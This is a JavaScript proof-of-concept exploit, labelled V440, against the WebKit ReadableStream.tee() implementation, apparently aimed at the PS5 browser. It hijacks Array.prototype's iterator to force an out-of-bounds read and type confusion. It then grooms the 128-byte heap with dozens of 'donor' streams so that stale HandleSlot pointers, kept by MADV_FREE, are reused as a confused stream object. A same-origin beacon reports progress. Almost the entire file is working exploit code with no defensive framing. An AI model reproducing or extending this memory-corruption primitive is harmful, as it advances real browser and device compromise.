/*
 * V440 -- MADV_FREE donor chain OOB
 *
 * Key insight from V438/V439: the OOB reads Vector data[1] which is
 * a Strong<JSObject> = HandleSlot (JSValue*). It's a DOUBLE deref:
 *   data[1] -> HandleSlot address -> JSValue -> asCell -> JSObject
 *
 * V438/V439 failed because spray objects don't fill the 128-byte
 * Vector data buffer — size class mismatch.
 *
 * NEW APPROACH: exploit MADV_FREE (freed pages keep data on PS5).
 *   1. Donor tee (normal) -> Vector(128B) with valid HandleSlots
 *   2. Vector freed -> 128-byte block returns to free list
 *   3. HandleSlot data PRESERVED (MADV_FREE)
 *   4. OOB tee IMMEDIATELY -> new Vector(128B) reuses freed block (LIFO)
 *   5. data[1] reads OLD HandleSlot -> still valid pointer!
 *   6. fromObject wraps old branch2 -> working confused stream
 *
 * Also test: type confusion substitution (V432 Primitive 1)
 *   - Replace branch2 with controlled object during Symbol.iterator
 *   - No OOB needed, no crash risk
 *   - Test what C++ APIs do with confused stream
 *
 * Beacon prefix: V440-
 */
(function(){
"use strict";
var BQ = 0;
function B(tag, data) {
  try {
    var x = new XMLHttpRequest();
    x.open("POST", "/beacon/V440-" + tag + "?q=" + (BQ++), false);
    x.setRequestHeader("Content-Type", "text/plain");
    x.send(typeof data === "object" ? JSON.stringify(data) : String(data || ""));
  } catch(e) {}
}

B("BOOT");

var origIter = Array.prototype[Symbol.iterator];

// OOB tee: return 1 element from SequenceConverter iterator
// results[1] reads uninitialized (or MADV_FREE stale) memory
function oobTee(rs) {
  var intercepted = false;
  Array.prototype[Symbol.iterator] = function() {
    var self = this;
    if (Array.isArray(self) && self.length === 2 && !intercepted) {
      intercepted = true;
      var items = [self[0]];
      var idx = 0;
      return {
        next: function() {
          if (idx < items.length) return {value: items[idx++], done: false};
          return {done: true};
        }
      };
    }
    return origIter.call(self);
  };
  var result;
  try { result = rs.tee(); }
  finally { Array.prototype[Symbol.iterator] = origIter; }
  return result;
}

// Substitution tee: replace branch2 with our controlled object
// NO OOB - results.size() == 2, just different content
function subTee(rs, fakeObj) {
  var intercepted = false;
  Array.prototype[Symbol.iterator] = function() {
    var self = this;
    if (Array.isArray(self) && self.length === 2 && !intercepted) {
      intercepted = true;
      var idx = 0;
      return {
        next: function() {
          if (idx === 0) { idx++; return {value: self[0], done: false}; }
          if (idx === 1) { idx++; return {value: fakeObj, done: false}; }
          return {done: true};
        }
      };
    }
    return origIter.call(self);
  };
  var result;
  try { result = rs.tee(); }
  finally { Array.prototype[Symbol.iterator] = origIter; }
  return result;
}

function probe(val) {
  try {
    if (val === null || val === undefined) return "null";
    if (typeof val === "number") return "num:" + val;
    if (typeof val === "string") return "str:" + val.slice(0, 30);
    if (typeof val === "boolean") return "bool:" + val;
    if (typeof val === "object") {
      var name = val.constructor ? val.constructor.name : "?";
      return "obj:" + name;
    }
    return typeof val;
  } catch(e) { return "err:" + e.message.slice(0, 40); }
}

// ================================================================
// Test A: Substitution type confusion (SAFE - no OOB)
// Replace branch2 with plain object
// ================================================================
function testA(cb) {
  B("A-START");

  var fakeObj = {
    marker: 0xBEEFCAFE,
    idx: 42,
    pad: "AAAAAAAAAAAAAAAA"
  };

  var rs = new ReadableStream({
    start: function(c) { c.enqueue("A-data"); c.close(); }
  });

  try {
    var result = subTee(rs, fakeObj);
    B("A-RESULT", {len: result.length});
    B("A-R0-TYPE", probe(result[0]));

    if (result[1]) {
      B("A-R1-TYPE", probe(result[1]));
      B("A-R1-IS-RS", result[1] instanceof ReadableStream);

      // Try stream operations on confused wrapper
      try {
        B("A-R1-LOCKED", result[1].locked);
      } catch(e) { B("A-R1-LOCKED-ERR", e.message.slice(0,60)); }

      try {
        var r = result[1].getReader();
        B("A-R1-READER-OK!!!");
        r.read().then(function(res) {
          B("A-R1-READ", {done: res.done, val: probe(res.value)});
          r.releaseLock();
        }).catch(function(e) { B("A-R1-READ-ERR", e.message.slice(0,60)); });
      } catch(e) { B("A-R1-READER-ERR", e.message.slice(0,60)); }

      // Can we still see our marker on the confused object?
      try {
        if (result[1].marker !== undefined)
          B("A-R1-MARKER!!!", result[1].marker);
      } catch(e) { B("A-R1-MARKER-ERR", e.message.slice(0,60)); }
    }
  } catch(e) {
    B("A-ERR", e.message.slice(0,80));
  }
  B("A-DONE");
  if (cb) setTimeout(cb, 2000);
}

// ================================================================
// Test B: Substitution with ArrayBuffer
// If AB wrapped as stream, what do C++ internals see?
// ================================================================
function testB(cb) {
  B("B-START");

  var ab = new ArrayBuffer(256);
  var view = new Uint32Array(ab);
  view[0] = 0xCAFE0001;
  view[1] = 0xDEAD0002;
  view[2] = 0xF00D0003;

  var rs = new ReadableStream({
    start: function(c) { c.enqueue("B-data"); c.close(); }
  });

  try {
    var result = subTee(rs, ab);
    B("B-RESULT", {len: result.length});

    if (result[1]) {
      B("B-R1-TYPE", probe(result[1]));
      B("B-R1-IS-RS", result[1] instanceof ReadableStream);
      B("B-R1-IS-AB", result[1] instanceof ArrayBuffer);

      // Try to use it as Response body
      try {
        var resp = new Response(result[1]);
        B("B-RESP-OK");
        resp.arrayBuffer().then(function(buf) {
          B("B-RESP-AB!!!", {len: buf.byteLength});
          var v2 = new Uint32Array(buf);
          B("B-RESP-DATA!!!", v2[0].toString(16) + "," + v2[1].toString(16));
        }).catch(function(e) { B("B-RESP-ERR", e.message.slice(0,60)); });
      } catch(e) { B("B-RESP-CREATE-ERR", e.message.slice(0,60)); }

      // Try stream operations
      try {
        B("B-R1-LOCKED", result[1].locked);
      } catch(e) { B("B-R1-LOCKED-ERR", e.message.slice(0,60)); }

      try {
        var r = result[1].getReader();
        B("B-R1-READER-OK!!!");
      } catch(e) { B("B-R1-READER-ERR", e.message.slice(0,60)); }
    }
  } catch(e) {
    B("B-ERR", e.message.slice(0,80));
  }
  B("B-DONE");
  if (cb) setTimeout(cb, 2000);
}

// ================================================================
// Test C: Substitution with ReadableStream (real stream from pool)
// This should work perfectly — wrapping a real stream AS a stream
// ================================================================
function testC(cb) {
  B("C-START");

  var poolRS = new ReadableStream({
    start: function(c) {
      c.enqueue("POOL-CHUNK-1");
      c.enqueue("POOL-CHUNK-2");
      c.close();
    }
  });

  var wrapperRS = new ReadableStream({
    start: function(c) { c.enqueue("C-wrapper"); c.close(); }
  });

  try {
    var result = subTee(wrapperRS, poolRS);
    B("C-RESULT", {len: result.length});

    if (result[1]) {
      B("C-R1-TYPE", probe(result[1]));
      B("C-R1-IS-RS", result[1] instanceof ReadableStream);

      try {
        B("C-R1-LOCKED", result[1].locked);
        var r = result[1].getReader();
        B("C-R1-READER-OK");
        r.read().then(function(res1) {
          B("C-R1-READ1!!!", {done: res1.done, val: probe(res1.value)});
          return r.read();
        }).then(function(res2) {
          B("C-R1-READ2!!!", {done: res2.done, val: probe(res2.value)});
          r.releaseLock();
        }).catch(function(e) { B("C-R1-READ-ERR", e.message.slice(0,60)); });
      } catch(e) { B("C-R1-GETREADER-ERR", e.message.slice(0,60)); }
    }
  } catch(e) {
    B("C-ERR", e.message.slice(0,80));
  }
  B("C-DONE");
  if (cb) setTimeout(cb, 3000);
}

// ================================================================
// Test D: MADV_FREE donor OOB
// Tight sequence: many donors -> OOB reuses freed Vector
// ================================================================
function testD(cb) {
  B("D-START");

  // Phase 1: Create many donor tees to warm the free list
  // Each tee creates a 128-byte Vector, fills [0] and [1] with
  // valid HandleSlots, then frees it on return
  var donorBranches = [];
  try {
    for (var i = 0; i < 32; i++) {
      var drs = new ReadableStream({
        start: function(c) { c.enqueue("D-donor-" + i); c.close(); }
      });
      var branches = drs.tee();
      donorBranches.push(branches);
    }
    B("D-DONORS-OK", donorBranches.length);
  } catch(e) {
    B("D-DONORS-ERR", e.message.slice(0,60));
  }

  // Phase 2: Drop all donor branch refs except a few
  // This frees the branch2 objects BUT the HandleSlot data
  // from the Vector persists (MADV_FREE)
  // Keep some alive to ensure HandleSlot targets survive
  var keptAlive = donorBranches.slice(0, 4);
  donorBranches = null;

  // Tiny GC nudge (don't go overboard — we want LIFO to work)
  var nudge = [];
  for (var j = 0; j < 10; j++) nudge.push({});
  nudge = null;

  // Phase 3: OOB tee — Vector should reuse a freed donor's block
  var oobRS = new ReadableStream({
    start: function(c) { c.enqueue("D-oob"); c.close(); }
  });

  try {
    var result = oobTee(oobRS);
    B("D-RESULT!!!", {len: result.length});

    if (result[1] !== undefined && result[1] !== null) {
      B("D-R1-TYPE!!!", typeof result[1]);
      B("D-R1-PROBE", probe(result[1]));
      B("D-R1-IS-RS", result[1] instanceof ReadableStream);

      try {
        B("D-R1-LOCKED", result[1].locked);
      } catch(e) { B("D-R1-LOCKED-ERR", e.message.slice(0,60)); }

      try {
        var r = result[1].getReader();
        B("D-R1-READER-OK!!!");
        r.read().then(function(res) {
          B("D-R1-READ!!!", {done: res.done, val: probe(res.value)});
          r.releaseLock();
        }).catch(function(e) { B("D-R1-READ-ERR", e.message.slice(0,60)); });
      } catch(e) { B("D-R1-READER-ERR", e.message.slice(0,60)); }
    } else {
      B("D-R1-EMPTY");
    }
  } catch(e) {
    B("D-OOB-CRASH", e.message.slice(0,80));
  }

  void keptAlive;
  B("D-DONE");
  if (cb) setTimeout(cb, 2000);
}

// ================================================================
// Test E: Heavy donor warmup + OOB
// More donors = higher LIFO probability of reuse
// ================================================================
function testE(cb) {
  B("E-START");

  // Phase 1: 100 donors — saturate the 128-byte free list
  var keptAlive = [];
  try {
    for (var i = 0; i < 100; i++) {
      var drs = new ReadableStream({
        start: function(c) { c.enqueue("E-d-" + i); c.close(); }
      });
      var branches = drs.tee();
      // Keep branch2 alive (so the JSObject at HandleSlot stays valid)
      if (i < 10) keptAlive.push(branches);
      // Other branches go out of scope — their Vector data blocks freed
    }
    B("E-DONORS-OK", 100);
  } catch(e) {
    B("E-DONORS-ERR", e.message.slice(0,60));
  }

  // Phase 2: OOB tee — should reuse most recent donor's Vector block
  var oobRS = new ReadableStream({
    start: function(c) { c.enqueue("E-oob"); c.close(); }
  });

  try {
    var result = oobTee(oobRS);
    B("E-RESULT!!!", {len: result.length});

    if (result[1] !== undefined && result[1] !== null) {
      B("E-R1-TYPE!!!", typeof result[1]);
      B("E-R1-PROBE", probe(result[1]));
      B("E-R1-IS-RS", result[1] instanceof ReadableStream);

      try {
        B("E-R1-LOCKED", result[1].locked);
      } catch(e) { B("E-R1-LOCKED-ERR", e.message.slice(0,60)); }

      try {
        var r = result[1].getReader();
        B("E-R1-READER-OK!!!");
        r.read().then(function(res) {
          B("E-R1-READ!!!", {done: res.done, val: probe(res.value)});
          r.releaseLock();
        }).catch(function(e) { B("E-R1-READ-ERR", e.message.slice(0,60)); });
      } catch(e) { B("E-R1-READER-ERR", e.message.slice(0,60)); }
    } else {
      B("E-R1-EMPTY");
    }
  } catch(e) {
    B("E-OOB-CRASH", e.message.slice(0,80));
  }

  void keptAlive;
  B("E-DONE");
  if (cb) setTimeout(cb, 2000);
}

// ================================================================
// Run: SAFE tests first (A,B,C), then OOB (D,E)
// If OOB crashes, we still get substitution results
// ================================================================
testA(function() {
  testB(function() {
    testC(function() {
      testD(function() {
        testE(function() {
          B("ALL-DONE");
        });
      });
    });
  });
});

})();
